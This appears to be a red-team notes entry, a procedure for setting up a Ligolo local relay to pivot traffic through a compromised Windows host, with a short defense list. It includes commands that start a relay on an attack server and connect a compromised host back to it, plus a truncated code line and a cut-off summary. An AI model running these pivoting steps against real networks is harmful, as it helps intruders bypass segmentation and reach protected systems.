---
id: 963519a9-d75e-44f2-b3c5-4ea9efbc7fae
name: Ligolo Local Relay Setup
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:22.825481+00:00'
updated_at: '2023-04-10T20:25:15.891227+00:00'
tags:
- '[[Ligolo]]'
- '[[Network Pivoting Techniques]]'
commands:
- '[[Connect to local relay server from compromise host]]'
- '[[Start local relay server]]'
---

# Ligolo Local Relay Setup

## Summary

Ligolo Local Relay Setup is a network pivoting technique used by attackers to gain access to systems that are not directly accessible from their current location. By setting up a local relay, attackers can redirect traffic through a compromised system to reach their target. This technique is common

## Description

# Description

Ligolo Local Relay Setup is a network pivoting technique used by attackers to gain access to systems that are not directly accessible from their current location. By setting up a local relay, attackers can redirect traffic through a compromised system to reach their target. This technique is commonly used to bypass firewalls, network segmentation, and other security measures. From a technical perspective, Ligolo Local Relay Setup involves configuring a compromised system to act as a relay for network traffic. This is typically done using tools like Netcat or Socat. From a business perspective, this technique can be used to gain access to sensitive data or systems that are not directly accessible, which can result in data theft, system compromise, and other serious consequences.

 

## Requirements

1. Access to a compromised system

1. Tools like Netcat or Socat

 

## Defense

1. Implement network segmentation to limit access to critical systems

1. Monitor network traffic for suspicious activity

1. Use multi-factor authentication to limit the impact of compromised credentials

 

## Objectives

1. Gain access to systems that are not directly accessible

1. Bypass firewalls, network segmentation, and other security measures

 

# Instructions

1. Follow these steps to set up a local relay:

 



**Code**: [[# On your attack server.
./bin/localrelay_linux_am]]



> 1. Download the localrelay_linux_amd64 binary on your attack server.
2. Run the binary on your attack server.
3. Download the ligolo_windows_amd64.exe on the compromised host.
4. Run the ligolo_windows_amd64.exe with the -relayserver option followed by the IP address and port of the local relay server.
5. The compromised host will now be able to communicate with the attack server through the local relay.



**Command** ([[Start local relay server]]):

```bash
./bin/localrelay_linux_amd64
```





**Command** ([[Connect to local relay server from compromise host]]):

```bash
ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
```



## Commands Used

- [[Connect to local relay server from compromise host]]
- [[Start local relay server]]

## Tags

- [[Ligolo]]
- [[Network Pivoting Techniques]]


